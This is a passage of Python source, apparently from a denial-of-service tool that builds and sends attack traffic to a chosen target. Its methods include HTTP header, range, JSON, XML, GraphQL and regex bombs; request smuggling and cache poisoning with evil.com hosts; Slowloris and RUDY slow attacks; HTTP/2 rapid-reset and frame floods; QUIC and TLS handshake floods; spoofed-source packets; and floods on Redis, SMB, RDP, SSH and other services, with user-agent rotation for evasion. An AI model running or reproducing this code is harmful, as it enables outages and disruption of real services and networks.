        def b():
            h = PerRequestIdentity(FastUAGenerator()).generate(self.target_host)["headers"]
            for i in range(50):
                h[f"X-Bomb-{i}"] = "A" * 5000
            req = "GET / HTTP/1.1\r\n"
            for k, v in h.items():
                req += f"{k}: {v}\r\n"
            req += "\r\n"
            return req.encode()
        self._http_raw("HEADER_BOMB", b)

    def _cache_bypass(self):
        self._http_raw("CACHE_BYPASS", lambda: (
            f"GET /?cb={secrets.token_hex(6)} HTTP/1.1\r\n"
            f"Host: {self.target_host}\r\n"
            f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
            f"Cache-Control: no-cache\r\nPragma: no-cache\r\n"
            f"Connection: close\r\n\r\n").encode())

    def _cache_poison(self):
        def b():
            fake = f"{secrets.token_hex(4)}.evil.com"
            return (f"GET /{secrets.token_hex(4)} HTTP/1.1\r\n"
                    f"Host: {self.target_host}\r\n"
                    f"X-Forwarded-Host: {fake}\r\nX-Original-URL: /admin\r\n"
                    f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                    f"Connection: close\r\n\r\n").encode()
        self._http_raw("CACHE_POISONING", b)

    def _range_bomb(self):
        def b():
            r = ",".join(
                f"{random.randint(0, 99999)}-{random.randint(100000, 999999)}"
                for _ in range(1000))
            return (f"GET / HTTP/1.1\r\nHost: {self.target_host}\r\n"
                    f"Range: bytes={r}\r\nConnection: close\r\n\r\n").encode()
        self._http_raw("RANGE_BOMB", b)

    def _range_amp(self):
        self._range_bomb()

    def _json_bomb(self):
        body = b'{"a":' * 10000 + b'1' + b'}' * 10000
        def b():
            return (f"POST /api HTTP/1.1\r\nHost: {self.target_host}\r\n"
                    f"Content-Type: application/json\r\n"
                    f"Content-Length: {len(body)}\r\n"
                    f"Connection: close\r\n\r\n").encode() + body
        self._http_raw("JSON_BOMB", b)

    def _xml_bomb(self):
        body = (b'<?xml version="1.0"?>\n<!DOCTYPE lolz [\n<!ENTITY lol "lol">\n' +
                b"".join(f'<!ENTITY lol{i} "' + b"&lol" * 10 + b';">\n'
                         for i in range(1, 8)) +
                b']>\n<lolz>&lol7;</lolz>')
        def b():
            return (f"POST /api HTTP/1.1\r\nHost: {self.target_host}\r\n"
                    f"Content-Type: application/xml\r\n"
                    f"Content-Length: {len(body)}\r\n"
                    f"Connection: close\r\n\r\n").encode() + body
        self._http_raw("XML_BOMB", b)

    def _protobuf_bomb(self):
        body = b"\x08\xff\xff\xff\xff\x0f" * 10000
        def b():
            return (f"POST /api HTTP/1.1\r\nHost: {self.target_host}\r\n"
                    f"Content-Type: application/x-protobuf\r\n"
                    f"Content-Length: {len(body)}\r\n"
                    f"Connection: close\r\n\r\n").encode() + body
        self._http_raw("PROTOBUF_BOMB", b)

    def _brotli_bomb(self):
        body = b"\x00" * 65536
        if HAS_BROTLI:
            with suppress(Exception):
                body = brotli.compress(secrets.token_bytes(1024), quality=11)
        def b():
            return (f"POST /api HTTP/1.1\r\nHost: {self.target_host}\r\n"
                    f"Content-Encoding: br\r\n"
                    f"Content-Length: {len(body)}\r\n"
                    f"Connection: close\r\n\r\n").encode() + body
        self._http_raw("BROTLI_BOMB", b)

    def _regex_dos(self):
        body = ("email=" + "a" * 50000 + "X@test.com").encode()
        def b():
            return (f"POST /register HTTP/1.1\r\nHost: {self.target_host}\r\n"
                    f"Content-Type: application/x-www-form-urlencoded\r\n"
                    f"Content-Length: {len(body)}\r\n"
                    f"Connection: close\r\n\r\n").encode() + body
        self._http_raw("REGEX_DOS", b)

    def _graphql_depth(self):
        depth = 5000
        q = json.dumps({"query": "query { " + "a { " * depth + "__typename" +
                                 " } " * depth + " }"}).encode()
        def b():
            return (f"POST /graphql HTTP/1.1\r\nHost: {self.target_host}\r\n"
                    f"Content-Type: application/json\r\n"
                    f"Content-Length: {len(q)}\r\n"
                    f"Connection: close\r\n\r\n").encode() + q
        self._http_raw("GRAPHQL_DEPTH", b)

    def _graphql_alias(self):
        aliases = " ".join(f"a{i}: __typename" for i in range(15000))
        q = json.dumps({"query": "query { " + aliases + " }"}).encode()
        def b():
            return (f"POST /graphql HTTP/1.1\r\nHost: {self.target_host}\r\n"
                    f"Content-Type: application/json\r\n"
                    f"Content-Length: {len(q)}\r\n"
                    f"Connection: close\r\n\r\n").encode() + q
        self._http_raw("GRAPHQL_ALIAS", b)

    def _smuggle_clte(self):
        self._http_raw("SMUGGLE_CLTE", lambda: (
            f"POST / HTTP/1.1\r\nHost: {self.target_host}\r\n"
            f"Content-Length: 44\r\nTransfer-Encoding: chunked\r\n\r\n"
            f"0\r\n\r\nGET /admin HTTP/1.1\r\nX: X").encode())

    def _smuggle_tecl(self):
        self._http_raw("SMUGGLE_TECL", lambda: (
            f"POST / HTTP/1.1\r\nHost: {self.target_host}\r\n"
            f"Content-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n"
            f"5c\r\nGPOST / HTTP/1.1\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n").encode())

    def _host_header_inject(self):
        def b():
            fake = f"{secrets.token_hex(6)}.evil.com"
            return (f"GET / HTTP/1.1\r\nHost: {self.target_host}\r\n"
                    f"X-Forwarded-Host: {fake}\r\nX-Host: {fake}\r\n"
                    f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                    f"Connection: close\r\n\r\n").encode()
        self._http_raw("HOST_HEADER_INJECT", b)

    def _operator_fatigue(self):
        def b():
            body = json.dumps({
                "alert": random.choice(["CRITICAL", "HIGH", "MEDIUM"]),
                "message": "SQL Injection"}).encode()
            return (f"POST /api/alerts HTTP/1.1\r\nHost: {self.target_host}\r\n"
                    f"Content-Type: application/json\r\n"
                    f"Content-Length: {len(body)}\r\n"
                    f"Connection: close\r\n\r\n").encode() + body
        self._http_raw("OPERATOR_FATIGUE", b)

    # ═════════════════════════════════════════════════════════════════════
    #  SLOW (async)
    # ═════════════════════════════════════════════════════════════════════

    async def _slowloris(self, sem: asyncio.Semaphore):
        while not self._stop:
            async with sem:
                try:
                    r, w = await asyncio.open_connection(self.target_ip, self.target_port)
                    req = (f"GET /?{secrets.token_hex(4)} HTTP/1.1\r\n"
                           f"Host: {self.target_host}\r\n"
                           f"User-Agent: {random.choice(USER_AGENTS)}\r\n")
                    w.write(req.encode())
                    await w.drain()
                    for _ in range(20):
                        if self._stop:
                            break
                        await asyncio.sleep(random.uniform(3, 7))
                        with suppress(Exception):
                            w.write(f"X-Pad-{secrets.token_hex(2)}: "
                                    f"{'A' * random.randint(50, 200)}\r\n".encode())
                            await w.drain()
                    with suppress(Exception):
                        w.close()
                    self._record("SLOWLORIS", 1, 300)
                except Exception:
                    self._record("SLOWLORIS", ok=False)

    async def _slow_read(self, sem: asyncio.Semaphore):
        while not self._stop:
            async with sem:
                try:
                    r, w = await asyncio.open_connection(self.target_ip, self.target_port)
                    w.write((f"GET /{secrets.token_hex(8)} HTTP/1.1\r\n"
                             f"Host: {self.target_host}\r\n\r\n").encode())
                    await w.drain()
                    for _ in range(30):
                        if self._stop:
                            break
                        with suppress(Exception):
                            chunk = await asyncio.wait_for(r.read(1024), timeout=5)
                            if not chunk:
                                break
                            await asyncio.sleep(random.uniform(3, 6))
                    with suppress(Exception):
                        w.close()
                    self._record("SLOW_READ", 1, 200)
                except Exception:
                    self._record("SLOW_READ", ok=False)

    async def _rudy(self, sem: asyncio.Semaphore):
        while not self._stop:
            async with sem:
                try:
                    r, w = await asyncio.open_connection(self.target_ip, self.target_port)
                    w.write((f"POST / HTTP/1.1\r\nHost: {self.target_host}\r\n"
                             f"Content-Type: application/x-www-form-urlencoded\r\n"
                             f"Content-Length: 10000000\r\n\r\n").encode())
                    await w.drain()
                    for _ in range(50):
                        if self._stop:
                            break
                        with suppress(Exception):
                            w.write(b"a" * 100)
                            await w.drain()
                            await asyncio.sleep(random.uniform(3, 7))
                    with suppress(Exception):
                        w.close()
                    self._record("RUDY", 1, 200)
                except Exception:
                    self._record("RUDY", ok=False)

    async def _slow_headers(self, sem: asyncio.Semaphore):
        while not self._stop:
            async with sem:
                try:
                    r, w = await asyncio.open_connection(self.target_ip, self.target_port)
                    w.write(f"GET / HTTP/1.1\r\nHost: {self.target_host}\r\n".encode())
                    await w.drain()
                    for i in range(200):
                        if self._stop:
                            break
                        await asyncio.sleep(random.uniform(1, 3))
                        with suppress(Exception):
                            w.write(f"X-H-{i}: {'A' * 50}\r\n".encode())
                            await w.drain()
                    with suppress(Exception):
                        w.close()
                    self._record("SLOW_HEADERS", 1, 100)
                except Exception:
                    self._record("SLOW_HEADERS", ok=False)

    async def _slow_body(self, sem: asyncio.Semaphore):
        while not self._stop:
            async with sem:
                try:
                    r, w = await asyncio.open_connection(self.target_ip, self.target_port)
                    w.write((f"POST / HTTP/1.1\r\nHost: {self.target_host}\r\n"
                             f"Content-Length: 5000000\r\n\r\n").encode())
                    await w.drain()
                    for _ in range(100):
                        if self._stop:
                            break
                        with suppress(Exception):
                            w.write(b"x" * 10)
                            await w.drain()
                            await asyncio.sleep(random.uniform(2, 5))
                    with suppress(Exception):
                        w.close()
                    self._record("SLOW_BODY", 1, 200)
                except Exception:
                    self._record("SLOW_BODY", ok=False)

    async def _ws_flood(self, sem: asyncio.Semaphore):
        if not HAS_WS:
            return
        uri = self.target_url.replace("http://", "ws://").replace("https://", "wss://")
        while not self._stop:
            async with sem:
                try:
                    async with websockets.connect(uri, ping_interval=None,
                                                   open_timeout=3,
                                                   max_size=None) as ws:
                        for _ in range(500):
                            if self._stop:
                                break
                            with suppress(Exception):
                                await ws.send(secrets.token_bytes(256))
                                self._record("WEBSOCKET_FLOOD", 1, 256)
                except Exception:
                    self._record("WEBSOCKET_FLOOD", ok=False)

    async def _ws_zip(self, sem: asyncio.Semaphore):
        if not HAS_WS:
            return
        uri = self.target_url.replace("http://", "ws://").replace("https://", "wss://")
        bomb = b"A" * 512
        if HAS_BROTLI:
            with suppress(Exception):
                bomb = brotli.compress(b"A" * 16777216, quality=11)
        while not self._stop:
            async with sem:
                try:
                    async with websockets.connect(uri, ping_interval=None,
                                                   open_timeout=3,
                                                   compression="deflate",
                                                   max_size=None) as ws:
                        for _ in range(20):
                            if self._stop:
                                break
                            with suppress(Exception):
                                await ws.send(bomb)
                                self._record("WEBSOCKET_ZIP", 1, len(bomb))
                except Exception:
                    self._record("WEBSOCKET_ZIP", ok=False)

    # ═════════════════════════════════════════════════════════════════════
    #  HTTP/2
    # ═════════════════════════════════════════════════════════════════════

    def _h2_rapid_reset(self):
        if not HAS_H2:
            return self._http_flood()
        while not self._stop:
            if not self._rate_ok():
                continue
            s = self._connect(5.0)
            if s is None:
                self._record("HTTP2_RAPID_RESET", ok=False)
                continue
            try:
                cfg2 = h2.config.H2Configuration(client_side=True,
                                                  header_encoding="utf-8")
                conn = h2.connection.H2Connection(config=cfg2)
                conn.initiate_connection()
                s.sendall(conn.data_to_send())
                for _ in range(500):
                    if self._stop:
                        break
                    try:
                        sid = conn.get_next_available_stream_id()
                        conn.send_headers(sid, [(":method", "GET"), (":path", "/"),
                                                 (":scheme", "https"),
                                                 (":authority", self.target_host)],
                                           end_stream=False)
                        conn.reset_stream(sid, error_code=0x08)
                        data = conn.data_to_send()
                        if data:
                            s.sendall(data)
                            self._record("HTTP2_RAPID_RESET", 2, len(data))
                    except Exception:
                        break
                with suppress(Exception):
                    s.close()
            except Exception:
                self._record("HTTP2_RAPID_RESET", ok=False)

    def _h2_ping(self):
        preface = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
        settings = b"\x00\x00\x00\x04\x00\x00\x00\x00\x00"
        while not self._stop:
            if not self._rate_ok():
                continue
            s = self._connect(3.0)
            if s is None:
                continue
            try:
                s.sendall(preface + settings)
                batch = b""
                for _ in range(1000):
                    batch += (struct.pack("!I", 8)[1:] +
                              b"\x06\x00\x00\x00\x00\x00" + secrets.token_bytes(8))
                s.sendall(batch)
                self._record("HTTP2_PING", 1000, len(batch))
                with suppress(Exception):
                    s.close()
            except Exception:
                self._record("HTTP2_PING", ok=False)

    def _h2_settings(self):
        preface = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
        while not self._stop:
            if not self._rate_ok():
                continue
            s = self._connect(3.0)
            if s is None:
                continue
            try:
                s.sendall(preface)
                sd = (struct.pack("!HI", 0x01, 0) +
                      struct.pack("!HI", 0x02, 0) +
                      struct.pack("!HI", 0x03, 100) +
                      struct.pack("!HI", 0x04, 0x7FFFFFFF))
                batch = b""
                for _ in range(200):
                    batch += (struct.pack("!I", len(sd))[1:] +
                              b"\x04\x00\x00\x00\x00\x00" + sd)
                s.sendall(batch)
                self._record("HTTP2_SETTINGS", 200, len(batch))
                with suppress(Exception):
                    s.close()
            except Exception:
                self._record("HTTP2_SETTINGS", ok=False)

    def _h2_window(self):
        preface = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
        settings = b"\x00\x00\x00\x04\x00\x00\x00\x00\x00"
        while not self._stop:
            if not self._rate_ok():
                continue
            s = self._connect(3.0)
            if s is None:
                continue
            try:
                s.sendall(preface + settings)
                batch = b""
                for _ in range(1000):
                    batch += (struct.pack("!I", 4)[1:] +
                              b"\x08\x00\x00\x00\x00\x00" +
                              struct.pack("!I", 0x7FFFFFFF))
                s.sendall(batch)
                self._record("HTTP2_WINDOW_UPDATE", 1000, len(batch))
                with suppress(Exception):
                    s.close()
            except Exception:
                self._record("HTTP2_WINDOW_UPDATE", ok=False)

    def _h2_hpack_bomb(self):
        if not HAS_H2:
            return self._http_flood()
        while not self._stop:
            if not self._rate_ok():
                continue
            s = self._connect(5.0)
            if s is None:
                continue
            try:
                cfg2 = h2.config.H2Configuration(client_side=True,
                                                  header_encoding="utf-8")
                conn = h2.connection.H2Connection(config=cfg2)
                conn.update_settings({h2.settings.SettingCodes.HEADER_TABLE_SIZE: 65536})
                conn.initiate_connection()
                s.sendall(conn.data_to_send())
                for _ in range(100):
                    if self._stop:
                        break
                    sid = conn.get_next_available_stream_id()
                    hdrs = [(":method", "GET"), (":path", "/"),
                            (":scheme", "https"),
                            (":authority", self.target_host)]
                    for i in range(200):
                        hdrs.append((f"x-c-{i}", "v" * 400))
                    conn.send_headers(sid, hdrs, end_stream=False)
                    with suppress(Exception):
                        s.sendall(conn.data_to_send())
                self._record("HTTP2_HPACK_BOMB", 1, 100000)
                with suppress(Exception):
                    s.close()
            except Exception:
                self._record("HTTP2_HPACK_BOMB", ok=False)

    def _h2_multiplex(self):
        preface = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
        settings = b"\x00\x00\x00\x04\x00\x00\x00\x00\x00"
        while not self._stop:
            if not self._rate_ok():
                continue
            s = self._connect(3.0)
            if s is None:
                continue
            try:
                s.sendall(preface + settings)
                hp = b"\x82\x84\x86\x41\x8c\xf1\xe3\xc0\xbf"
                batch = b""
                for i in range(2000):
                    sid = (i * 2 + 1) & 0x7FFFFFFF
                    batch += (struct.pack("!I", len(hp))[1:] +
                              b"\x01\x05" + struct.pack("!I", sid) + hp)
                s.sendall(batch)
                self._record("HTTP2_MULTIPLEX", 2000, len(batch))
                with suppress(Exception):
                    s.close()
            except Exception:
                self._record("HTTP2_MULTIPLEX", ok=False)

    def _h2_goaway(self):
        preface = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
        settings = b"\x00\x00\x00\x04\x00\x00\x00\x00\x00"
        while not self._stop:
            if not self._rate_ok():
                continue
            s = self._connect(3.0)
            if s is None:
                continue
            try:
                s.sendall(preface + settings)
                batch = b""
                for _ in range(500):
                    pl = struct.pack("!II", random.randint(0, 0x7FFFFFFF),
                                     random.choice([0, 1, 2, 3, 8, 11]))
                    batch += (struct.pack("!I", len(pl))[1:] +
                              b"\x07\x00\x00\x00\x00\x00" + pl)
                s.sendall(batch)
                self._record("HTTP2_GOAWAY", 500, len(batch))
                with suppress(Exception):
                    s.close()
            except Exception:
                self._record("HTTP2_GOAWAY", ok=False)

    def _h2_rst_spam(self):
        preface = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
        settings = b"\x00\x00\x00\x04\x00\x00\x00\x00\x00"
        while not self._stop:
            if not self._rate_ok():
                continue
            s = self._connect(3.0)
            if s is None:
                continue
            try:
                s.sendall(preface + settings)
                batch = b""
                for _ in range(2000):
                    sid = secrets.randbits(31)
                    pl = struct.pack("!I", random.choice([0, 1, 2, 3, 8, 11]))
                    batch += (struct.pack("!I", len(pl))[1:] +
                              b"\x03\x00" + struct.pack("!I", sid) + pl)
                s.sendall(batch)
                self._record("HTTP2_RST_SPAM", 2000, len(batch))
                with suppress(Exception):
                    s.close()
            except Exception:
                self._record("HTTP2_RST_SPAM", ok=False)

    def _h2_made_you_reset(self):
        if not HAS_H2:
            return self._http_flood()
        while not self._stop:
            if not self._rate_ok():
                continue
            s = self._connect(5.0)
            if s is None:
                continue
            try:
                cfg2 = h2.config.H2Configuration(client_side=True,
                                                  header_encoding="utf-8")
                conn = h2.connection.H2Connection(config=cfg2)
                conn.initiate_connection()
                s.sendall(conn.data_to_send())
                for _ in range(100):
                    if self._stop:
                        break
                    sid = conn.get_next_available_stream_id()
                    conn.send_headers(sid, [(":method", "POST"), (":path", "/"),
                                             (":scheme", "https"),
                                             (":authority", self.target_host)],
                                       end_stream=False)
                    conn.send_data(sid, b"A" * 2048, end_stream=False)
                    conn.reset_stream(sid, error_code=0x08)
                    with suppress(Exception):
                        s.sendall(conn.data_to_send())
                self._record("HTTP2_MADE_YOU_RESET", 100, 80000)
                with suppress(Exception):
                    s.close()
            except Exception:
                self._record("HTTP2_MADE_YOU_RESET", ok=False)

    def _h2_smuggling(self):
        if not HAS_H2:
            return self._smuggle_clte()
        while not self._stop:
            if not self._rate_ok():
                continue
            s = self._connect(5.0)
            if s is None:
                continue
            try:
                cfg2 = h2.config.H2Configuration(client_side=True,
                                                  header_encoding="utf-8")
                conn = h2.connection.H2Connection(config=cfg2)
                conn.initiate_connection()
                s.sendall(conn.data_to_send())
                sid = conn.get_next_available_stream_id()
                conn.send_headers(sid, [(":method", "POST"), (":path", "/"),
                                         (":scheme", "https"),
                                         (":authority", self.target_host),
                                         ("transfer-encoding", "chunked"),
                                         ("content-length", "4")], end_stream=False)
                conn.send_data(sid, b"0\r\n\r\nGET /admin HTTP/1.1\r\nX: X",
                               end_stream=False)
                s.sendall(conn.data_to_send())
                self._record("HTTP2_SMUGGLING", 1, 200)
                with suppress(Exception):
                    s.close()
            except Exception:
                self._record("HTTP2_SMUGGLING", ok=False)

    def _h2_grpc_churn(self):
        if not HAS_H2:
            return self._http_flood()
        while not self._stop:
            if not self._rate_ok():
                continue
            s = self._connect(5.0)
            if s is None:
                continue
            try:
                cfg2 = h2.config.H2Configuration(client_side=True,
                                                  header_encoding="utf-8")
                conn = h2.connection.H2Connection(config=cfg2)
                conn.initiate_connection()
                s.sendall(conn.data_to_send())
                for _ in range(500):
                    if self._stop:
                        break
                    sid = conn.get_next_available_stream_id()
                    conn.send_headers(sid, [(":method", "POST"),
                                             (":path", "/grpc.channelz.v1.Channelz/GetServers"),
                                             (":scheme", "https"),
                                             (":authority", self.target_host),
                                             ("content-type", "application/grpc"),
                                             ("te", "trailers")], end_stream=False)
                    conn.send_data(sid, b"\x00\x00\x00\x00\x00", end_stream=False)
                    conn.reset_stream(sid, error_code=0x08)
                    with suppress(Exception):
                        s.sendall(conn.data_to_send())
                self._record("HTTP2_GRPC_CHURN", 500, 75000)
                with suppress(Exception):
                    s.close()
            except Exception:
                self._record("HTTP2_GRPC_CHURN", ok=False)

    def _h2_priority(self):
        self._h2_multiplex()

    def _h2_continuation(self):
        self._h2_hpack_bomb()

    # ═════════════════════════════════════════════════════════════════════
    #  HTTP/3 (raw UDP)
    # ═════════════════════════════════════════════════════════════════════

    def _h3_flood(self, name: str, builder: Callable[[bytes, bytes], bytes]):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 64 * 1024 * 1024)
        except Exception:
            return
        try:
            while not self._stop:
                if not self._rate_ok():
                    continue
                try:
                    dcid = secrets.token_bytes(8)
                    scid = secrets.token_bytes(8)
                    pkt = builder(dcid, scid)
                    s.sendto(pkt, (self.target_ip, self.target_port or 443))
                    self._record(name, 1, len(pkt))
                except Exception:
                    self._record(name, ok=False)
        finally:
            with suppress(Exception):
                s.close()

    def _h3_quic_flood(self):
        self._h3_flood("HTTP3_QUIC_FLOOD", lambda d, s: (
            b"\xc3\x00\x00\x00\x01" + bytes([len(d)]) + d +
            bytes([len(s)]) + s + b"\x00\x44\x9a" + secrets.token_bytes(1200)))

    def _h3_qpack_bomb(self):
        def b(d, s):
            hdr = (b"\xc0\x00\x00\x00\x01" + bytes([len(d)]) + d +
                   bytes([len(s)]) + s)
            return hdr + b"\x00\x00\x00\x01\xff\x00\x00\x1d" + secrets.token_bytes(1200)
        self._h3_flood("HTTP3_QPACK_BOMB", b)

    def _h3_retry(self):
        def b(d, s):
            return (b"\xf0\x00\x00\x00\x01" + bytes([len(d)]) + d +
                    bytes([len(s)]) + s + secrets.token_bytes(32))
        self._h3_flood("HTTP3_RETRY_LOOP", b)

    def _h3_0rtt(self):
        self._h3_flood("HTTP3_0RTT",
            lambda d, s: b"\x50" + d + secrets.token_bytes(1200))

    def _h3_close(self):
        def b(d, s):
            hdr = (b"\xc0\x00\x00\x00\x01" + bytes([len(d)]) + d +
                   bytes([len(s)]) + s)
            pl = (struct.pack("!B", 0x1C) + struct.pack("!I", 0) +
                  struct.pack("!B", 0) + struct.pack("!H", 1200) +
                  secrets.token_bytes(1200))
            return hdr + pl
        self._h3_flood("HTTP3_CLOSE_FLOOD", b)

    def _h3_stream_reset(self):
        def b(d, s):
            hdr = (b"\xc0\x00\x00\x00\x01" + bytes([len(d)]) + d +
                   bytes([len(s)]) + s)
            batch = b""
            for i in range(50):
                sid = i * 4 + 2
                batch += (struct.pack("!B", 4) + struct.pack("!I", sid) +
                          struct.pack("!I", random.choice([0x100, 0x101, 0x102])) +
                          struct.pack("!H", 0))
            return hdr + batch
        self._h3_flood("HTTP3_STREAM_RESET", b)

    def _quic_leak(self):
        self._h3_flood("QUIC_LEAK", lambda d, s: (
            b"\xc3\x00\x00\x00\x01" + bytes([len(d)]) + d +
            bytes([len(s)]) + s + secrets.token_bytes(1400)))

    # ═════════════════════════════════════════════════════════════════════
    #  TLS
    # ═════════════════════════════════════════════════════════════════════

    def _tls_hello(self, name: str, ech: bool = False):
        while not self._stop:
            if not self._rate_ok():
                continue
            s = self._connect(5.0)
            if s is None:
                self._record(name, ok=False)
                continue
            try:
                ch = self._build_client_hello(ech)
                s.sendall(ch)
                with suppress(Exception):
                    s.settimeout(2)
                    s.recv(1024)
                with suppress(Exception):
                    s.close()
                self._record(name, 1, len(ch))
            except Exception:
                self._record(name, ok=False)

    def _build_client_hello(self, ech: bool = False) -> bytes:
        ciphers = random.sample([0x1301, 0x1302, 0x1303, 0xC02B, 0xC02F,
                                  0xCCA9, 0xCCA8, 0x009C, 0x009D, 0x002F], k=8)
        session = secrets.token_bytes(random.choice([0, 16, 32]))
        rnd = secrets.token_bytes(32)
        sni_b = self.target_host.encode()
        exts = []
        exts.append((0x0000, struct.pack("!H", len(sni_b) + 3) + b"\x00" +
                     struct.pack("!H", len(sni_b)) + sni_b))
        groups = random.sample([29, 23, 24, 25, 256, 257], k=4)
        exts.append((0x000A, struct.pack("!H", len(groups) * 2) +
                     b"".join(struct.pack("!H", g) for g in groups)))
        sigs = random.sample([0x0403, 0x0503, 0x0603, 0x0804, 0x0805], k=5)
        exts.append((0x000D, struct.pack("!H", len(sigs) * 2) +
                     b"".join(struct.pack("!H", s) for s in sigs)))
        exts.append((0x0010, struct.pack("!H", 3) + bytes([2]) + b"h2"))
        exts.append((0x002B, b"\x02\x03\x04"))
        exts.append((0x000B, b"\x01\x00"))
        exts.append((0x0023, b""))
        if random.random() > 0.5:
            exts.append((0x0029, secrets.token_bytes(20)))
        if random.random() > 0.3:
            exts.append((0x0033, struct.pack("!H", 2) +
                         struct.pack("!H", 29) + struct.pack("!H", 32) +
                         secrets.token_bytes(32)))
        if ech:
            exts.append((0xFE0D, secrets.token_bytes(random.randint(32, 128))))
        random.shuffle(exts)
        exts_b = b"".join(struct.pack("!HH", t, len(d)) + d for t, d in exts)
        ch_body = (b"\x03\x03" + rnd + bytes([len(session)]) + session +
                   struct.pack("!H", len(ciphers) * 2) +
                   b"".join(struct.pack("!H", c) for c in ciphers) +
                   b"\x01\x00" +
                   struct.pack("!H", len(exts_b)) + exts_b)
        hs = b"\x01" + struct.pack("!I", len(ch_body))[1:] + ch_body
        return b"\x16\x03\x01" + struct.pack("!H", len(hs)) + hs

    def _tls_client_hello(self): self._tls_hello("TLS_CLIENT_HELLO")
    def _tls_ja3(self): self._tls_hello("TLS_JA3_RANDOM")
    def _tls_ja4(self): self._tls_hello("TLS_JA4_RANDOM")
    def _tls_reneg(self): self._tls_hello("TLS_RENEGOTIATION")
    def _tls_heartbleed(self): self._tls_hello("TLS_HEARTBLEED")
    def _tls_ech(self): self._tls_hello("TLS_ECH_FLOOD", ech=True)
    def _sni_flood(self): self._tls_hello("SNI_FLOOD")

    def _sni_spoof(self):
        if not HAS_SCAPY:
            return self._sni_flood()
        fakes = ["cdn.jsdelivr.net", "cdnjs.cloudflare.com",
                 "ajax.googleapis.com", "static.cloudflareinsights.com"]
        while not self._stop:
            if not self._rate_ok():
                continue
            try:
                sni = random.choice(fakes)
                ch = self._build_client_hello_for(sni)
                ip = S_IP(src=rand_ip(), dst=self.target_ip,
                          ttl=random.randint(1, 3))
                tcp = S_TCP(sport=rand_port(), dport=self.target_port or 443,
                            seq=secrets.randbits(32), flags="PA")
                s_send(ip / tcp / S_Raw(ch), verbose=False)
                self._record("SNI_SPOOF", 1, len(ch))
            except Exception:
                self._record("SNI_SPOOF", ok=False)

    def _build_client_hello_for(self, sni: str) -> bytes:
        sni_b = sni.encode()
        hello = (b"\x16\x03\x01" + struct.pack(">H", 0) + b"\x01" +
                 b"\x00\x00\x00" + b"\x03\x03" + secrets.token_bytes(32) +
                 b"\x00" + b"\x00\x02\x00\x2F" + b"\x01\x00" +
                 struct.pack(">H", 5 + len(sni_b)) + b"\x00\x00" +
                 struct.pack(">H", 5 + len(sni_b)) +
                 struct.pack(">H", 3 + len(sni_b)) + b"\x00" +
                 struct.pack(">H", len(sni_b)) + sni_b)
        hello = hello[:3] + struct.pack(">H", len(hello) - 5) + hello[5:]
        hello = hello[:6] + struct.pack(">I", len(hello) - 9)[1:] + hello[9:]
        return hello

    # ═════════════════════════════════════════════════════════════════════
    #  SERVICES
    # ═════════════════════════════════════════════════════════════════════

    def _tcp_svc(self, name: str, port: int, builder: Callable[[], bytes]):
        while not self._stop:
            if not self._rate_ok():
                continue
            s = self._connect(2.0)
            if s is None:
                self._record(name, ok=False)
                continue
            try:
                pl = builder()
                if pl:
                    s.send(pl)
                with suppress(Exception):
                    s.settimeout(1)
                    s.recv(1024)
                self._record(name, 1, len(pl) if pl else 0)
            except Exception:
                self._record(name, ok=False)
            finally:
                with suppress(Exception):
                    s.close()

    def _redis(self):
        self._tcp_svc("REDIS_FLOOD", 6379,
            lambda: b"*3\r\n$3\r\nSET\r\n$5\r\n" + secrets.token_bytes(5) +
                    b"\r\n$5\r\n" + secrets.token_bytes(5) + b"\r\n")

    def _mongo(self):
        self._tcp_svc("MONGO_FLOOD", 27017, lambda: secrets.token_bytes(200))

    def _elastic(self):
        body = b'{"query":{"match_all":{}},"size":10000}'
        def b():
            return (f"POST /_search HTTP/1.1\r\nHost: {self.target_host}\r\n"
                    f"Content-Type: application/json\r\n"
                    f"Content-Length: {len(body)}\r\n"
                    f"Connection: close\r\n\r\n").encode() + body
        self._tcp_svc("ELASTIC_BOMB", 9200, b)

    def _mqtt(self):
        self._tcp_svc("MQTT_FLOOD", 1883,
            lambda: b"\x30\x10\x00\x05topic" + secrets.token_bytes(10))

    def _amqp(self):
        self._tcp_svc("AMQP_FLOOD", 5672, lambda: b"AMQP\x00\x00\x09\x01")

    def _rdp(self):
        self._tcp_svc("RDP_FLOOD", 3389,
            lambda: b"\x03\x00\x00\x13\x0e\xe0\x00\x00\x00\x00\x00"
                    b"\x01\x00\x08\x00\x03\x00\x00\x00")

    def _vnc(self):
        self._tcp_svc("VNC_FLOOD", 5900, lambda: b"RFB 003.008\n")

    def _smb(self):
        self._tcp_svc("SMB_FLOOD", 445,
            lambda: b"\x00\x00\x00\x85\xffSMB\x72" + secrets.token_bytes(100))

    def _smtp(self):
        self._tcp_svc("SMTP_FLOOD", 25,
            lambda: b"EHLO test\r\nMAIL FROM:<a@b.com>\r\n"
                    b"RCPT TO:<c@d.com>\r\nDATA\r\n" +
                    secrets.token_bytes(5000) + b"\r\n.\r\n")

    def _imap(self):
        self._tcp_svc("IMAP_FLOOD", 143, lambda: b"a001 LOGIN test test\r\n")

    def _pop3(self):
        self._tcp_svc("POP3_FLOOD", 110, lambda: b"USER test\r\nPASS test\r\n")

    def _ftp(self):
        self._tcp_svc("FTP_FLOOD", 21,
            lambda: b"USER " + secrets.token_hex(3).encode() + b"\r\n")

    def _telnet(self):
        self._tcp_svc("TELNET_FLOOD", 23,
            lambda: b"\xff\xfd\x18\xff\xfd\x20\xff\xfd\x23\xff\xfd\x27")

    def _ssh(self):
        self._tcp_svc("SSH_FLOOD", 22,
            lambda: b"SSH-2.0-" + secrets.token_hex(4).encode() + b"\r\n")

    def _rtsp(self):
        self._tcp_svc("RTSP_FLOOD", 554,
            lambda: b"DESCRIBE rtsp://x/ RTSP/1.0\r\nCSeq: 1\r\n\r\n")

    def _nfs(self):
        self._tcp_svc("NFS_FLOOD", 2049, lambda: secrets.token_bytes(200))

